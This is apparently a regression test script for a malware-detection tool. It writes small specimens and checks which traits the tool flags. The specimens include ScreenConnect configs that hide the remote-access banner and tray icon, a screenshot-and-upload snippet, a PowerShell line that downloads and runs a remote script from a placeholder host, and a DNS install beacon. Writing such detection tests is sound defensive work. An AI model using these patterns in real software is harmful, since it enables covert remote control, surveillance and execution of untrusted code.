#!/usr/bin/env python3
"""Static regression controls. Specimens are never executed or imported."""
import json
import os
from pathlib import Path
import subprocess
import tempfile

ROOT = Path(__file__).resolve().parents[3]
CLEAVE = os.environ.get('CLEAVE', str(ROOT.parent / 'cleave/target/release/cleave'))
SC = 'well-known/dual-use/remote-admin/screenconnect::screenconnect-product-identity'
CUSTOM = 'objectives/command-and-control/backdoor/control/rmm::screenconnect-anomalous-deployment'
HIDE = 'objectives/evasion/process/concealment::screenconnect-configured-indicators-off'
UPLOAD = 'micro-behaviors/communications/http/upload::python-post-screenshot-body'
MULTIPART = 'micro-behaviors/communications/http/upload::python-http-files-parameter'
OLD_SCREEN = 'objectives/exfiltration/stealer/screen::python-screenshot-exfil'
CASES = []

def add(name, ext, source, required=(), forbidden=(), high=None):
    CASES.append((name, ext, source, set(required), set(forbidden), high))

def xml(settings):
    return '<configuration><ScreenConnect.ApplicationSettings>' + ''.join(
        f'<setting name="{name}" serializeAs="String"><value>{value}</value></setting>'
        for name, value in settings.items()) + '</ScreenConnect.ApplicationSettings></configuration>'

visible = {'AccessShowSystemTrayIcon': 'true', 'AccessShowUnderControlBanner': 'true',
           'SupportShowBalloonOnConnect': 'true', 'SupportShowBalloonOnHide': 'true'}
add('screenconnect-default', 'xml', xml(visible), [SC], [CUSTOM, HIDE], (0, 1))
for setting in visible:
    add('single-' + setting, 'xml', xml({setting: 'false'}), [SC, CUSTOM, HIDE])
add('screenconnect-custom-relay', 'xml', xml({'ClientLaunchParametersConstraint':
    '?h=relay.example.org&amp;p=8041&amp;k=local-key'}), [SC, CUSTOM], [HIDE])
add('screenconnect-stock-relay', 'xml', xml({'ClientLaunchParametersConstraint':
    '?h=tenant-relay.screenconnect.com&amp;p=443&amp;k=local-key'}), [SC], [CUSTOM, HIDE])
add('unrelated-product-setting', 'xml', '<configuration><Other.ApplicationSettings>'
    '<setting name="AccessShowSystemTrayIcon"><value>false</value></setting>'
    '</Other.ApplicationSettings></configuration>', (), [SC, CUSTOM, HIDE])
add('screenconnect-absent-user-consent', 'xml', xml({'AutoConsentIfUserProcessNotRunning': 'true'}),
    [SC, CUSTOM], [HIDE])
add('screenconnect-banner-numeric', 'xml', xml({'AccessShowUnderControlBanner': '0'}),
    [SC, CUSTOM, HIDE])
add('screenshot-http-body', 'py', 'from PIL import ImageGrab\nimport requests\n'
    'image = ImageGrab.grab()\nrequests.post(url, data=image)\n', [UPLOAD], [OLD_SCREEN])
add('unrelated-screenshot-and-post', 'py', 'from PIL import ImageGrab\nimport requests\n'
    'def draw():\n    return ImageGrab.grab()\n'
    'def send():\n    requests.post(url, data=other)\n', (), [UPLOAD, OLD_SCREEN])
add('screenshot-wrong-value', 'py', 'from PIL import ImageGrab\nimport requests\n'
    'image = ImageGrab.grab()\nrequests.post(url, data=other)\n', (), [UPLOAD, OLD_SCREEN])
add('multipart-upload', 'py', 'import requests\nrequests.post(url, files=parts)\n', [MULTIPART])
add('multipart-prose-only', 'py', '# requests.post(url, files=parts)\n', (), [MULTIPART])
add('multipart-unrelated-calls', 'py', 'request.post(url)\nother(files=parts)\n', (), [MULTIPART])
add('character-data', 'vbs', ('s = s & Chr(65) & Chr(66) & Chr(67) & Chr(68)\n' * 4),
    ['micro-behaviors/data/decode/char-code::vb-repeated-chr-concatenation'], high=(0, 0))
add('vb-api-references', 'vbs', 'Declare Function SetThreadContext Lib "kernel32" '
    '(ByVal hThread As Long, lpContext As Any) As Long\n'
    'Declare Function OpenProcess Lib "kernel32" (ByVal a As Long) As Long\n'
    'Declare Function TerminateProcess Lib "kernel32" (ByVal h As Long) As Long\n'
    'Const CALG_RC4 = 26625\nConst CALG_MD5 = 32771\n',
    ['micro-behaviors/process/thread/config::set-thread-context-vb-reference',
     'micro-behaviors/crypto/hash/digest::calg-md5-vb-reference',
     'micro-behaviors/crypto/symmetric/stream/rc4::calg-rc4-vb-reference'], high=(0, 0))
add('untrusted-pipeline', 'ps1', 'iwr -useb http://stage.example.org/code.ps1 | iex\n',
    ['micro-behaviors/process/deploy/script-eval::powershell-web-response-piped-eval-text'], high=(0, 0))
add('dns-ordinary-clock', 'js', 'const dns=require("dns");\n'
    'dns.lookup("localhost", console.log);\nconst seconds=Math.floor(Date.now()/1000);\n', (),
    ['objectives/supply-chain/recon-exfil/dns::dns-install-beacon'])
add('dns-bound-gothere', 'js', 'const dns=require("dns");\n'
    'const n=Date.now(); dns.lookup(\'gotHere\'+n+\'.example.org\',()=>{});\n',
    ['objectives/supply-chain/recon-exfil/dns::dns-install-beacon'])

def main():
    with tempfile.TemporaryDirectory(prefix='good-pool-controls-') as tmp:
        paths = []
        for name, ext, source, *_ in CASES:
            path = Path(tmp) / (name + '.' + ext)
            path.write_text(source)
            paths.append(str(path))
        run = subprocess.run([CLEAVE, '--traits-dir', str(ROOT), '--format', 'jsonl', *paths],
                             capture_output=True, text=True, check=True)
        decoder = json.JSONDecoder()
        rest = run.stdout.lstrip()
        results = {}
        while rest:
            report, end = decoder.raw_decode(rest)
            rest = rest[end:].lstrip()
            for file in report.get('files', []):
                results[Path(file['path']).stem] = file.get('traits', [])
        for name, _, _, required, forbidden, high in CASES:
            traits = results[name]
            actual = {t['id'] for t in traits}
            assert required <= actual, (name, 'missing', sorted(required - actual))
            assert not forbidden & actual, (name, 'unexpected', sorted(forbidden & actual))
            if high is not None:
                counts = (sum(t.get('crit') == 5 for t in traits), sum(t.get('crit') == 4 for t in traits))
                assert counts == high, (name, counts, high)
    print(json.dumps({'passed': len(CASES), 'cases': [c[0] for c in CASES]}, indent=2))

if __name__ == '__main__':
    main()
